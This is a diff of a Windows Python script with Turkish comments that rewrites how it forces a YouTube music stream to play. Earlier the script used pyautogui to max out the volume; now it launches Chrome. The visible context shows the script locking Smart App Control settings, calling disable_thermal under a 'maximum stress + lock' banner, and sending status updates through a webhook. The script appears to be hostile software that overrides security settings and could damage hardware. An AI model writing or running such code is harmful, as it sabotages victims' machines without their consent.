@@ -8,7 +8,6 @@ import requests
 import multiprocessing
 import winreg
 import webbrowser
-import pyautogui
 
 # ==========================================
 # WEBHOOK
@@ -173,42 +172,19 @@ def lock_smart_app_control_settings():
         return False
 
 # ==========================================
-# 8) YOUTUBE MÜZİK AÇ (SES FULL)
+# 8) YOUTUBE MÜZİK AÇ (PYAUTOGUİ OLMADAN)
 # ==========================================
 def play_music():
     try:
-        send_notification("🎵 Müzik açılıyor... (Ses full)")
-        
-        # YouTube linkini aç
+        send_notification("🎵 Müzik açılıyor...")
         url = "https://www.youtube.com/watch?v=Z2etJpxjwJE&list=RDZ2etJpxjwJE&start_radio=1"
-        webbrowser.open(url)
         
-        time.sleep(5)  # Sayfanın yüklenmesini bekle
-        
-        # Sesi full yap (pyautogui ile)
-        try:
-            # Windows ses karıştırıcısını aç
-            subprocess.run('sndvol', shell=True)
-            time.sleep(1)
-            
-            # Ses seviyesini artır (Volume Up tuşu)
-            for _ in range(20):
-                pyautogui.press('volumeup')
-                time.sleep(0.2)
-            
-            # Ses karıştırıcısını kapat
-            pyautogui.hotkey('alt', 'f4')
-        except:
-            pass
-        
-        # YouTube'da sesi full yap (tıklama ile)
-        try:
-            # Tarayıcıda ses seviyesine tıkla
-            pyautogui.click(x=100, y=100)  # Tarayıcıya odaklan
-            time.sleep(1)
-            pyautogui.click(x=500, y=500)  # Ses butonuna tıkla
-        except:
-            pass
+        # Chrome ile aç
+        chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+        if os.path.exists(chrome_path):
+            subprocess.Popen([chrome_path, url], shell=True)
+        else:
+            webbrowser.open(url)
         
         send_notification("✅ Müzik açıldı!")
         return True
@@ -221,7 +197,6 @@ def play_music():
 # ==========================================
 send_notification("🔥🔥🔥 MAKSİMUM ZORLAMA + KİLİT + MÜZİK BAŞLATILDI! 🔥🔥🔥")
 
-# Müzik aç (arka planda)
 threading.Thread(target=play_music, daemon=True).start()
 
 disable_thermal()
